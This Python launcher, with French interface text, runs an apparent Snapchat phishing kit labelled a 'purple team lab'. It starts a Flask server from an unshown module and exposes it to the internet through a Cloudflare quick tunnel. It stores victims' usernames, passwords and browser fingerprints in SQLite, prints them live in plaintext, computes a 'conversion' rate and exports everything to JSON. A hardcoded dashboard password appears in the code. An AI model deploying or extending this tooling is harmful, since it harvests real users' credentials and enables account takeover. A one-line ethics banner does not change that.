"""
Snapchat Phishing Lab — Purple Team
Usage : python launcher.py
"""

import os, sys, json, sqlite3, time, threading, socket, webbrowser, subprocess, re
from datetime import datetime

BASE = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE, "captured_credentials.db")
CF_PATH = os.path.join(BASE, "cloudflared.exe")
ACCESS_PW = "76247010aidafamoussa"

sys.path.insert(0, BASE)

flask_thread = None
cf_thread = None
cf_url = None
cf_proc = None

def db():
    return sqlite3.connect(DB_PATH)

def cls():
    os.system("cls" if os.name == "nt" else "clear")

def logo():
    print("""
  ╔═══════════════════════════════════════════════════════╗
  ║   SNAPCHAT PHISHING LAB — PURPLE TEAM                ║
  ║   Recherche ethique - Consentement requis            ║
  ╚═══════════════════════════════════════════════════════╝
    """)

def is_server_running():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.settimeout(1)
        s.connect(("127.0.0.1", 5000))
        return True
    except:
        return False
    finally:
        s.close()

def start_flask():
    os.environ["PYTHONIOENCODING"] = "utf-8"
    import logging as _lg
    _lg.getLogger("werkzeug").setLevel(_lg.ERROR)
    _lg.getLogger("flask").setLevel(_lg.ERROR)
    from main import app, init_database
    init_database()
    app.run(host="0.0.0.0", port=5000, threaded=True, use_reloader=False)

def start_server():
    global flask_thread
    if is_server_running():
        return True
    flask_thread = threading.Thread(target=start_flask, daemon=True)
    flask_thread.start()
    for _ in range(15):
        if is_server_running():
            return True
        time.sleep(0.5)
    return False

def stop_server():
    try:
        import requests
        requests.post("http://127.0.0.1:5000/shutdown", timeout=2)
    except:
        pass

def start_tunnel():
    global cf_thread, cf_url, cf_proc
    if not os.path.exists(CF_PATH):
        return None
    cf_url = None
    cf_proc = None
    cf_thread = threading.Thread(target=_run_tunnel, daemon=True)
    cf_thread.start()
    for _ in range(30):
        if cf_url:
            return cf_url
        time.sleep(0.5)
    return None

def _run_tunnel():
    global cf_url, cf_proc
    try:
        proc = subprocess.Popen(
            [CF_PATH, "tunnel", "--url", "http://127.0.0.1:5000"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        cf_proc = proc
        if not proc.stdout:
            return
        for line in iter(proc.stdout.readline, b''):
            text = line.decode("utf-8", errors="replace").strip()
            m = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', text)
            if m:
                cf_url = m.group(0)
            if "failed" in text.lower() or "error" in text.lower():
                pass
    except:
        pass

def stop_tunnel():
    global cf_proc, cf_url
    if cf_proc:
        try:
            cf_proc.terminate()
            cf_proc.wait(timeout=5)
        except:
            try: cf_proc.kill()
            except: pass
        cf_proc = None
    cf_url = None

def server_url():
    url = "http://localhost:5000"
    if cf_url:
        url = f"{url}  |  CF: {cf_url}"
    return url

def menu():
    while True:
        cls()
        logo()
        status = "🟢 EN LIGNE" if is_server_running() else "🔴 ARRETE"
        show_dashboard_preview()
        print(f"\n  Serveur : http://localhost:5000  |  {status}")
        if cf_url and is_server_running():
            print(f"  Tunnel   : {cf_url}")
        print(f"  {'─'*50}")
        print("""
  ┌──────────────────────────────────────────────────┐
  │  [1] LANCER LOCAL       [2] TABLEAU DE BORD     │
  │  [3] LANCER CLOUDFLARE  [4] WATCH LIVE          │
  │  [5] NAVIGATEUR         [0] QUITTER             │
  └──────────────────────────────────────────────────┘
        """)
        c = input("  > ").strip()
        if c == "1":
            stop_tunnel()
            if start_server():
                print("\n  ✓ http://localhost:5000\n")
            else:
                print("  ✗ Echec du demarrage\n")
            input("  Entree...")
        elif c == "3":
            if not os.path.exists(CF_PATH):
                print(f"\n  ✗ cloudflared.exe introuvable dans le dossier.\n")
                input("  Entree..."); continue
            if not start_server():
                print("  ✗ Echec du demarrage du serveur\n")
                input("  Entree..."); continue
            print("\n  Demarrage du tunnel Cloudflare...")
            url = start_tunnel()
            if url:
                print(f"  ✓ Tunnel actif : {url}\n")
            else:
                print("  ✗ Echec du tunnel\n")
            input("  Entree...")
        elif c == "2":
            if check_pw(): dashboard()
        elif c == "4":
            watch_live()
        elif c == "5":
            open_browser()
        elif c == "0":
            stop_tunnel()
            print("\n  Bye.\n"); break

def show_dashboard_preview():
    if not is_server_running():
        return
    try:
        conn = db()
        total = conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
        with_pw = conn.execute("SELECT COUNT(*) FROM captured_credentials WHERE password != '' AND password IS NOT NULL").fetchone()[0]
        sessions = conn.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'").fetchone()[0]
        conv = f"{round(total/sessions*100,1)}%" if sessions else "0%"
        print(f"\n  Captures: {total}  |  Avec PW: {with_pw}  |  Sessions: {sessions}  |  Conversion: {conv}")

        rows = conn.execute("SELECT id, step, username, password, timestamp FROM captured_credentials ORDER BY id DESC LIMIT 3").fetchall()
        if rows:
            print(f"  {'─'*50}")
            for r in rows:
                pw = "***" if r[3] else "-"
                print(f"  #{r[0]:<3} [{r[1]:<8}] {r[2][:24]:<24} | {pw:<8} | {r[4][:19]}")
        conn.close()
    except:
        pass

def watch_live():
    if not is_server_running():
        print("\n  ✗ Le serveur n'est pas lance. Option [1] ou [3] d'abord.\n")
        input("  Entree..."); return
    last_id = 0
    try:
        conn = db()
        last_id = conn.execute("SELECT COALESCE(MAX(id),0) FROM captured_credentials").fetchone()[0]
        conn.close()
    except:
        pass
    print("\n  [WATCH LIVE] En attente de captures... (Ctrl+C pour arreter)\n")
    try:
        while True:
            time.sleep(1.5)
            conn = db()
            rows = conn.execute("SELECT id, step, username, password, timestamp FROM captured_credentials WHERE id > ? ORDER BY id", (last_id,)).fetchall()
            conn.close()
            for r in rows:
                identifiant = r[2] or "-"
                motdepasse = r[3] if r[3] else "-"
                step = r[1] or "?"
                print(f"  [{step}] {identifiant} / {motdepasse}")
                last_id = r[0]
    except KeyboardInterrupt:
        pass

def check_pw():
    p = input("\n  Mot de passe > ")
    if p != ACCESS_PW:
        print("  ✗ Acces refuse.\n"); time.sleep(1); return False
    return True

def open_browser():
    target = cf_url if cf_url else "http://localhost:5000"
    webbrowser.open(target)
    print(f"\n  ✓ {target}\n")
    input("  Entree...")

def dashboard():
    while True:
        cls()
        logo()
        print("  🔐 TABLEAU DE BORD\n")
        print("  ┌─────────────────────────────────────────────┐")
        print("  │  [1] Statistiques                          │")
        print("  │  [2] Identifiants (masques)                │")
        print("  │  [3] Identifiants + Mots de passe          │")
        print("  │  [4] Logs d'activite                       │")
        print("  │  [5] Exporter en JSON                      │")
        print("  │  [6] Fingerprints                          │")
        print("  │  [7] Effacer les donnees                   │")
        print("  │  [0] Retour                                │")
        print("  └─────────────────────────────────────────────┘\n")
        c = input("  > ").strip()
        if c == "1": show_stats()
        elif c == "2": list_creds(False)
        elif c == "3": list_creds(True)
        elif c == "4": show_logs()
        elif c == "5": export_json()
        elif c == "6": show_fingerprints()
        elif c == "7": reset_data()
        elif c == "0": break

def fmt_row(headers, rows):
    cols = len(headers)
    col_w = [max(len(h), max((len(str(r[i])) for r in rows), default=0)) for i, h in enumerate(headers)]
    line = lambda r: "  │ " + " │ ".join(str(r[i]).ljust(col_w[i]) for i in range(cols)) + " │"
    hdr = "  │ " + " │ ".join(h.ljust(col_w[i]) for i, h in enumerate(headers)) + " │"
    print(f"  ┌{'┬'.join('─'*(w+2) for w in col_w)}┐")
    print(hdr)
    print(f"  ├{'┼'.join('─'*(w+2) for w in col_w)}┤")
    for r in rows: print(line(r))
    print(f"  └{'┴'.join('─'*(w+2) for w in col_w)}┘")

def show_stats():
    cls(); logo()
    conn = db()
    total = conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
    with_pw = conn.execute("SELECT COUNT(*) FROM captured_credentials WHERE password != '' AND password IS NOT NULL").fetchone()[0]
    sessions = conn.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'").fetchone()[0]
    unique = conn.execute("SELECT COUNT(DISTINCT participant_id) FROM captured_credentials").fetchone()[0]
    daily = conn.execute("SELECT DATE(timestamp), COUNT(*) FROM captured_credentials GROUP BY DATE(timestamp) ORDER BY DATE(timestamp) DESC LIMIT 7").fetchall()
    conn.close()
    print("  [STATISTIQUES]\n")
    fmt_row(
        ["Sessions", "Captures", "Avec PW", "Uniques", "Conversion"],
        [[sessions, total, with_pw, unique, f"{round(total/sessions*100,1) if sessions else 0}%"]]
    )
    if daily:
        print("\n  Derniers 7 jours :")
        for d, cnt in daily:
            print(f"    {d} : {cnt}")
    print()
    input("  Entree...")

def list_creds(show_pw):
    cls(); logo()
    conn = db()
    rows = conn.execute("SELECT id, participant_id, username, password, timestamp, step FROM captured_credentials ORDER BY id DESC").fetchall()
    conn.close()
    if not rows:
        print("\n  Aucune donnee.\n"); input("  Entree..."); return
    print(f"\n  [{len(rows)} entree(s)]\n")
    for r in rows:
        pw = r[3] if (show_pw and r[3]) else ("***" if r[3] else "-")
        step = r[5] or "?"
        print(f"  #{r[0]:<3} [{step:<8}] {r[1][:20]:<20} | {r[2] or '-':<20} | {pw:<20} | {r[4][:19]}")
    print()
    input("  Entree...")

def show_fingerprints():
    cls(); logo()
    conn = db()
    rows = conn.execute("SELECT id, participant_id, screen_resolution, timezone, browser_language, platform, time_on_page, referrer, click_count, step FROM captured_credentials WHERE screen_resolution != '' ORDER BY id DESC").fetchall()
    conn.close()
    if not rows:
        print("\n  Aucune donnee de fingerprint.\n"); input("  Entree..."); return
    print(f"\n  [FINGERPRINTS] ({len(rows)} entree(s))\n")
    for r in rows:
        print(f"  #{r[0]} [{r[9]}] {r[1][:20]}")
        print(f"    Ecran: {r[2]}  |  Fuseau: {r[3]}")
        print(f"    Langue: {r[4]}  |  Plateforme: {r[5]}")
        print(f"    Temps: {r[6]}s  |  Clics: {r[8]}")
        if r[7]: print(f"    Referrer: {r[7]}")
        print()
    input("  Entree...")

def show_logs():
    cls(); logo()
    conn = db()
    rows = conn.execute("SELECT id, event_type, participant_id, details, timestamp FROM experiment_log ORDER BY id DESC LIMIT 30").fetchall()
    conn.close()
    if not rows:
        print("\n  Aucun log.\n"); input("  Entree..."); return
    print("\n  [LOGS]\n")
    for r in rows:
        d = ""
        if r[3]:
            try: d = json.loads(r[3]); d = f" | {json.dumps(d, ensure_ascii=False)}"
            except: pass
        print(f"  #{r[0]} {r[1]} | {r[2] or '-'} | {r[4]}{d}")
    print()
    input("  Entree...")

def export_json():
    conn = db()
    rows = conn.execute("SELECT * FROM captured_credentials").fetchall()
    cols = [d[0] for d in conn.execute("PRAGMA table_info(captured_credentials)").fetchall()]
    conn.close()
    data = [dict(zip(cols, r)) for r in rows]
    for d in data:
        d.pop("id", None)
    path = os.path.join(BASE, "export.json")
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    print(f"\n  Exporte: {path} ({len(data)} entrees)\n")
    input("  Entree...")

def reset_data():
    confirm = input("\n  Effacer TOUTES les donnees ? (oui/non) > ").strip().lower()
    if confirm != "oui":
        print("  Annule.\n"); input("  Entree..."); return
    conn = db()
    conn.execute("DELETE FROM captured_credentials")
    conn.execute("DELETE FROM experiment_log")
    conn.commit()
    conn.close()
    print("  Donnees effacees.\n")
    input("  Entree...")

if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        stop_tunnel()
        print("\n\n  Bye.\n")
